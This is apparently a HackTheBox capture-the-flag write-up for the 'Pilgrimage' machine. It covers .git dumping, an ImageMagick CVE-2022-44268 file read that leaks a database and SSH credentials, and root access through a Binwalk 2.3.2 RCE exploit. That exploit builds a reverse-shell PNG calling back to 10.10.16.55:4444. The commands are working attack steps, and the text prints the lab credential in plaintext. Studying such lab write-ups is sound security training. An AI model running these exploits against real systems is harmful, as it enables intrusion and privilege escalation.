#box #imagemagick #git #git-dumper #binwalk

>* Never trust too much into a clear path, sometimes it might be worth to look deeper is something isn't working
>* Enumerate enumerate enumerate, before trying anything else.

Pilgrimage is a super interesting machine revolving around scripts hidden in images. During the nmap scans we discover that only SSH and port 80 are open. Once on port 80 we discover the presence of a file upload website, after trying to achieve a file upload vulnerability in the classical way, we discover through enumeration the presence of a `.git` folder which is accessible. We use user [git-dumper](https://github.com/arthaud/git-dumper) to properly download the content on that endpoint. Inside that dump we discover the presence of a binary called `magick`. The name is the short version for `ImageMagick` which is an executable responsible for some image manipulation operations. By discovering its version `7.1.0-49` we also discover it's vulnerability to an Arbitrary File Read vulnerability. Within the dump, we also discover that the php files contain a reference to a database file located in `/var/db/pilgrimage`. Thus, by leveraging ImageMagick vulnerability we opt to exfiltrate the database to check for the data inside of it. We discover the credentials for `emily` and this permit us to authenticate through SSH.
Once on the machine, we discover a suspicious folder in our home folder, called `.config`. Inside of it something recalls of a binary called `binwalk`. Similarly we discover on `ps aux` that a root is using a running a shell file called `malwarescan.sh` and right on top of it a binary called `inotifywait` that is running on `/var/www/pilgrimage.htb/shrunk`. By opening `/usr/sbin/malwarescan.sh` we realize that this shell script is recalling `inotifywait` to scan the folder and then runs `binwalk` on the files found in it. We also discover that the currently installed `binwalk` version, 2.3.2 is vulnerable to a RCE vulnerability. We craft an image file containing a reverse shell and we upload it with `scp` into `/var/www/pilgrimage.htb/shrunk` to obtain a reverse shell.

## Nmap

```bash
# Nmap 7.95 scan initiated Thu Sep 11 18:08:34 2025 as: /usr/lib/nmap/nmap -sCV --min-rate=10000 -o nmap_sCV 10.129.126.157
Nmap scan report for 10.129.126.157
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 11 18:08:46 2025 -- 1 IP address (1 host up) scanned in 11.90 seconds
```
## 80 - HTTP

On port 80 we discover an application permitting us to register, login and upload an image that is going to be shrinked. After performing some classical tries to achieve a File Upload RCE, our [[FFuF#Directory Fuzzing|enumeration]] returns the presence of a readable `.git` endpoint:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt  -u http://pilgrimage.htb/FUZZ -c -ic  -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pilgrimage.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 26ms]
.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6, Duration: 26ms]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 26ms]
.git/index              [Status: 200, Size: 3768, Words: 22, Lines: 16, Duration: 26ms]
.git/logs/refs          [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 26ms]
.git/logs/HEAD          [Status: 200, Size: 195, Words: 13, Lines: 2, Duration: 26ms]
login.php               [Status: 200, Size: 6166, Words: 1648, Lines: 172, Duration: 25ms]
register.php            [Status: 200, Size: 6173, Words: 1646, Lines: 172, Duration: 25ms]
tmp                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 25ms]
```

We opt to use [git-dumper](https://github.com/arthaud/git-dumper) to properly dump the whole `.git` endpoint on our machine. Inside our git dump we fundamentally find 2 key findings:
* A binary called `magick` short name for `ImageMagick` an utility to perform operations on images
* Some PHP files referring to a database file at `/var/db/pilgrimage`

By looking closely the version's binary we discover that it's vulnerable to an Arbitrary File Read vulnerability:

```bash
./magick

Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

The vulnerability refers to [CVE-2022-44268](https://git.rotfl.io/v/CVE-2022-44268) and works in the following way:
* `cargo run "$filename"` (which is the `dotnet run` equivalent of Rust) generates a malicious image
* Uploading the image on the website shrinks it, thus the vulnerable version of `ImageMagick` alters it
* Once uploaded, we can `wget` it and within an utility called `identify` we can check its content in-depth
* In its content we are now able to see a hex correspondence that can be decrypted to str with python's `bytes.fromhex` to read the content of `$filename`

Therefore, we decide to generate an image that will return us the content of `/var/db/pilgrimage`:

```bash
cargo run "/var/db/pilgrimage"
```

Then we upload the image on the website and wget it:

```bash
wget http://pilgrimage.htb/shrunk/68c468427ed95.png
```

We then read its content:

```bash
identify -verbose 68c468427ed95.png
```

Now, we first copy the hex content and paste it into a file, then we get rid of all the `\n` to have a oneliner:

```bash
tr -d '\n' < hex > hex-oneliner
```

Finally, we convert the hex string into a `sql.db` with the following script:

```python
with open("./hex-oneliner", "rb") as f:
    data = bytes.fromhex(f.read().decode())
with open("sql.db", "wb") as f:
    f.write(data)
```

Obtaining a sqlite db:

```bash
file sql.db 
sql.db: SQLite 3.x database, last written using SQLite version 3034001, file counter 69, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 69
```

By opening it (actually also reading it with `cat` is enough to find the password) we discover a new pair of credentials, giving us a foothold in SSH:
`emily:abigchonkyboi123` 
## binwalk to root

Once on the target machine, we discover in our `home` folder the presence of an unusual `.config` folder. Inside of it we discover references to an utility called `binwalk`. We then decide to know more about it:

```bash
emily@pilgrimage:~$ which binwalk
/usr/local/bin/binwalk
```

By trying to run it, the `help` prompt appears showing us its version: `Binwalk v2.3.2`. By looking online we notice that this version is vulnerable to a RCE vulnerability.
We look for it with `searchsploit`:

```bash
searchsploit binwalk                                                   
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Binwalk v2.3.2 - Remote Command Execution (RCE)                                                    | python/remote/51249.py
--------------------------------------------------------------------------------------------------- ---------------------------------
```

and then download it:

```bash
searchsploit -m python/remote/51249.py
```

By looking at the script we realize that it basically sets up a reverse shell with `netcat`, so we run the script with the intended fields to prompt the reverse shell when triggered:

```bash
python3 51249.py $image 10.10.16.55 4444
```

Once done, we'll obtain a malicious png file called `binwalk_exploit.png`. We can now transfer that file on the target machine and run it:

```bash
scp ./binwalk_exploit.png emily@pilgrimage.htb:/tmp/
```

We then try to run `binwalk` on the target machine:

```bash
/usr/local/bin/binwalk -M -e /tmp/binwalk_exploit.png
```

Something happens but...it didn't quite work as intended.

>Here we ended up in a loophole. Unfortunately sticking with the idea that the flaw was there blinded me. This teaches me that it's extremely important to always look at other opportunities once something feels like it's not working as expected

## inotifywait recalling binwalk to root

Within `ps aux` we discover the presence of a `sh` file being called by `root` in an unprotected folder:

```bash
root         685  0.0  0.0   6816  2344 ?        S    02:49   0:00 /bin/bash /usr/sbin/malwarescan.sh
```

We then investigate the content of `malwarescan.sh`:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

Basically, another binary called `inotifywait` is operating on the folder `/var/www/pilgrimage.htb/shrunk` (the same folder where images are being uploaded from the website) and is then launching `binwalk` with a command that is not too far from the vulnerability discovered. We can try to upload n image into the `/shrunk` folder and see whether we can get a reverse shell.

We then use the previously generated image and we use `scp` to copy it in the `/shrunk` folder:

```bash
scp ./binwalk_exploit.png emily@pilgrimage.htb:/var/www/pilgrimage.htb/shrunk/
```

Obtaining a reverse shell on our netcat listener.
